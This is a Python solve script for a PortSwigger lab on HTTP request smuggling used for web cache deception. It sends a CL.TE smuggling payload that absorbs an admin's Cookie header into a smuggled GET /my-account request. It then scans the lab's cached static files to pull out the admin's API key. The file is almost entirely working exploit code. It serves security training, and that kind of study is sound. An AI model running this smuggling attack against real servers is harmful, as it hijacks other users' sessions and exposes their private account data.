#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to perform web cache deception.

Smuggle `GET /my-account` with a dangling `X-Ignore:` header. The admin's
request arrives on the connection, their Cookie: header is absorbed as part
of the smuggled request's headers, and the back-end processes /my-account
as the admin. The front-end caches that response under the admin's requested
static URL. We pull the lab home page's static resources and extract the key.

Raw TLS sockets throughout.
"""

import argparse
import re
import socket
import ssl
import time
import urllib.request
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 42\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /my-account HTTP/1.1\r\n"
    "X-Ignore: X"
)


def send_once(host: str, port: int, body: bytes) -> bytes:
    ctx = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            ssock.sendall(body)
            data = b""
            try:
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 2000:
                        break
            except socket.timeout:
                pass
            return data


def fetch(url: str) -> str:
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode(errors="replace")
    except Exception:
        return ""


def scan_for_api_key(lab_url: str) -> str | None:
    """Fetch the home page, pull every static resource it references,
    and look for 'Your API Key' in each cached response."""
    home = fetch(lab_url)
    static_paths = re.findall(r'["\'](/[^"\']+\.(?:js|css|png|svg|ico))["\']', home)
    seen = set()
    for path in static_paths:
        if path in seen:
            continue
        seen.add(path)
        body = fetch(lab_url.rstrip("/") + path)
        m = re.search(r"Your API Key:\s*([A-Za-z0-9]+)", body)
        if m:
            return m.group(1)
    return None


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 12 (web cache deception)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("--attempts", type=int, default=6, help="Smuggle attempts")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    print("[*] Waiting 30s for admin session to establish...")
    time.sleep(30)

    for i in range(1, args.attempts + 1):
        print(f"\n[*] Attempt {i}/{args.attempts}: sending smuggle")
        resp = send_once(host, port, body)
        status = resp.split(b"\r\n", 1)[0].decode(errors="replace") if resp else "<empty>"
        print(f"    Response: {status}")

        time.sleep(20)
        print("[*] Scanning cached static resources for admin's API key...")
        key = scan_for_api_key(args.lab_url.rstrip("/"))
        if key:
            print(f"\n[+] Admin API key: {key}")
            print(f"[*] Submit it as the lab solution to complete.")
            return

    print("\n[-] API key not found. Try more attempts or verify the lab is live.")


if __name__ == "__main__":
    main()
